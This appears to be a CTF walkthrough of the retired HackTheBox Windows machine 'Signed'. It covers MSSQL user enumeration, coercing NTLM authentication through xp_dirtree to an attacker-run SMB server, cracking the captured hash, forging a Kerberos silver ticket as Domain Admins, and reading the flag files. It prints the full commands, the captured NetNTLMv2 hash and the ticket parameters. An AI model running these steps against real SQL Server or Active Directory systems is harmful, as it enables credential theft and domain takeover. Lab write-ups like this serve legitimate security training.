---
title: HackTheBox | Signed
by: initialt
date: 2026-02-11 15:09:01 +0100
categories: [CTF, walk-trough, hackthebox]
tags: [hackthebox, walk-trough, signed, ctf]
image:
  path: /assets/img/2026-02-12-HTB-Signed/banner.png 
  alt: HackTheBox | Signed
---

Signed is a retired Windows machine on HackTheBox, after some initial scanning:

``` bash
└─$ nmap signed.htb -T5 -Pn       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 12:21 EST
Nmap scan report for signed.htb (10.10.11.90)
Host is up (0.033s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
```

we have only mssql port open, and provided user/pass:

MSSQL service: `scott / Sm230#C5NatH`

The first thing to do is enum AD users:

`nxc mssql signed.htb -u scott -p "Sm230#C5NatH" --rid-brute --local-auth`

```
MSSQL       10.10.11.90     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90     1433   DC01             [+] DC01\scott:Sm230#C5NatH 
MSSQL       10.10.11.90     1433   DC01             498: SIGNED\Enterprise Read-only Domain Controllers
MSSQL       10.10.11.90     1433   DC01             500: SIGNED\Administrator
MSSQL       10.10.11.90     1433   DC01             501: SIGNED\Guest
MSSQL       10.10.11.90     1433   DC01             502: SIGNED\krbtgt
MSSQL       10.10.11.90     1433   DC01             512: SIGNED\Domain Admins
MSSQL       10.10.11.90     1433   DC01             513: SIGNED\Domain Users
MSSQL       10.10.11.90     1433   DC01             514: SIGNED\Domain Guests
MSSQL       10.10.11.90     1433   DC01             515: SIGNED\Domain Computers
MSSQL       10.10.11.90     1433   DC01             516: SIGNED\Domain Controllers
MSSQL       10.10.11.90     1433   DC01             517: SIGNED\Cert Publishers
MSSQL       10.10.11.90     1433   DC01             518: SIGNED\Schema Admins
MSSQL       10.10.11.90     1433   DC01             519: SIGNED\Enterprise Admins
MSSQL       10.10.11.90     1433   DC01             520: SIGNED\Group Policy Creator Owners
MSSQL       10.10.11.90     1433   DC01             521: SIGNED\Read-only Domain Controllers
MSSQL       10.10.11.90     1433   DC01             522: SIGNED\Cloneable Domain Controllers
MSSQL       10.10.11.90     1433   DC01             525: SIGNED\Protected Users
MSSQL       10.10.11.90     1433   DC01             526: SIGNED\Key Admins
MSSQL       10.10.11.90     1433   DC01             527: SIGNED\Enterprise Key Admins
MSSQL       10.10.11.90     1433   DC01             553: SIGNED\RAS and IAS Servers
MSSQL       10.10.11.90     1433   DC01             571: SIGNED\Allowed RODC Password Replication Group
MSSQL       10.10.11.90     1433   DC01             572: SIGNED\Denied RODC Password Replication Group
MSSQL       10.10.11.90     1433   DC01             1000: SIGNED\DC01$
MSSQL       10.10.11.90     1433   DC01             1101: SIGNED\DnsAdmins
MSSQL       10.10.11.90     1433   DC01             1102: SIGNED\DnsUpdateProxy
MSSQL       10.10.11.90     1433   DC01             1103: SIGNED\mssqlsvc
MSSQL       10.10.11.90     1433   DC01             1104: SIGNED\HR
MSSQL       10.10.11.90     1433   DC01             1105: SIGNED\IT
MSSQL       10.10.11.90     1433   DC01             1106: SIGNED\Finance
MSSQL       10.10.11.90     1433   DC01             1107: SIGNED\Developers
MSSQL       10.10.11.90     1433   DC01             1108: SIGNED\Support
MSSQL       10.10.11.90     1433   DC01             1109: SIGNED\oliver.mills
MSSQL       10.10.11.90     1433   DC01             1110: SIGNED\emma.clark
MSSQL       10.10.11.90     1433   DC01             1111: SIGNED\liam.wright
MSSQL       10.10.11.90     1433   DC01             1112: SIGNED\noah.adams
MSSQL       10.10.11.90     1433   DC01             1113: SIGNED\ava.morris
MSSQL       10.10.11.90     1433   DC01             1114: SIGNED\sophia.turner
MSSQL       10.10.11.90     1433   DC01             1115: SIGNED\james.morgan
MSSQL       10.10.11.90     1433   DC01             1116: SIGNED\mia.cooper
MSSQL       10.10.11.90     1433   DC01             1117: SIGNED\elijah.brooks
MSSQL       10.10.11.90     1433   DC01             1118: SIGNED\isabella.evans
MSSQL       10.10.11.90     1433   DC01             1119: SIGNED\lucas.murphy
MSSQL       10.10.11.90     1433   DC01             1120: SIGNED\william.johnson
MSSQL       10.10.11.90     1433   DC01             1121: SIGNED\charlotte.price
MSSQL       10.10.11.90     1433   DC01             1122: SIGNED\henry.bennett
MSSQL       10.10.11.90     1433   DC01             1123: SIGNED\amelia.kelly
MSSQL       10.10.11.90     1433   DC01             1124: SIGNED\jackson.gray
MSSQL       10.10.11.90     1433   DC01             1125: SIGNED\harper.diaz
MSSQL       10.10.11.90     1433   DC01             1126: SIGNED\SQLServer2005SQLBrowserUser$DC01
```


To retreive NetNTLMv2 user hash I started my own samba
``` bash
└─$ python3 smbserver.py -smb2support -debug testshare . 
Impacket v0.14.0.dev0+20251222.151741.b7f9f3b9 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/Essentials/impacket/venv/lib/python3.13/site-packages/impacket
[*] Config file parsed
[+] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[+] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

and then executed in mssql
``` sql
EXEC master.sys.xp_dirtree "\\10.10.15.55\testshare", 1, 1
```

In samba logs:

``` bash
[*] Incoming connection (10.10.11.90,62928)
[*] AUTHENTICATE_MESSAGE (SIGNED\mssqlsvc,DC01)
[*] User DC01\mssqlsvc authenticated successfully
[*] mssqlsvc::SIGNED:aaaaaaaaaaaaaaaa:fe6d5458144b0fb6998085dc5555bf5a:010100000000000000534f0b1e79dc012020e84ddf4b9078000000000100100041005200610061004100620079004f000300100041005200610061004100620079004f00020010004300410071005100710076007800560004001000430041007100510071007600780056000700080000534f0b1e79dc010600040002000000080030003000000000000000000000000030000008c368d729da04ce90150d3e1c87cf4574e4ffe16a1910bcf4adca9ceea4152e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350035000000000000000000
[*] Closing down connection (10.10.11.90,62928)
[*] Remaining connections []
```

Copy hash and crack it with hashcat -m 5600
and we have a password to 

```
mssqlsvc
p---SNIP---@
```

``` bash
└─$ python3 mssqlclient.py mssqlscv:'p---SNIP---@'@signed.htb -windows-auth
Impacket v0.14.0.dev0+20251222.151741.b7f9f3b9 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC01): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
```


sync time with the machine (I dunno if necessary)

`sudo timedatectl set-timezone America/Los_Angeles`

because
`impacket-mssqlclient -p 1433 mssqlsvc:'p---SNIP---@!@'@10.10.11.90 -windows-auth`

works fine, probably because of venv has no access to proper timezone? I don't know but now I need to target a user for Silver Ticket attack:

``` sql
SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';


role       member                      
--------   -------------------------   
sysadmin   sa                          
sysadmin   SIGNED\IT                   
sysadmin   NT SERVICE\SQLWriter        
sysadmin   NT SERVICE\Winmgmt          
sysadmin   NT SERVICE\MSSQLSERVER      
sysadmin   NT SERVICE\SQLSERVERAGENT   
```

so we are targeting IT user, we need to obtain SIDs for both users

``` sql
SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('SIGNED\IT')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   

SQL (SIGNED\mssqlsvc  guest@master)> SELECT master.sys.fn_varbintohexstr(SUSER_SID('SIGNED\mssqlsvc'));
                                                             
----------------------------------------------------------   
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000   
```

converting from mssql sid to the canonical AD string, need to do this in powershell

``` powershell
$hex = '0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
$bytes = [System.Runtime.Remoting.Metadata.W3cXsd2001.SoapHexBinary]::Parse($hex).Value
$sid = [System.Security.Principal.SecurityIdentifier]::new($bytes, 0)
$sid.Value

S-1-5-21-4088429403-1159899800-2753317549-1105

S-1-5-21-4088429403-1159899800-2753317549-1103
```

we have almost everything needed to issue the kerberos silver ticket

one last is ntlm hash from mssqlsvc password, i used https://www.browserling.com/tools/ntlm-hash to get it:
`EF699384C3285C54128A3EE1DDB1A0CC`

512 group is Domain Admins group, now I can issue a ticket, login and select flags:

``` bash
impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain SIGNED.HTB -groups 1105,512 -spn mssqlsvc/DC01.SIGNED.HTB:1433 -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -user-id 1103 mssqlsvc

└─$ export KRB5CCNAME=/home/kali/Essentials/impacket/examples/mssqlsvc.ccache 
                                                                                   
impacket-mssqlclient -p 1433 -k -no-pass DC01.SIGNED.HTB

SELECT * FROM OPENROWSET(BULK N'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS a;

BulkColumn                                
---------------------------------------   
b'87---0a\r\n'   

SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS a;
BulkColumn                                
---------------------------------------   
b'e1---7d\r\n'   
```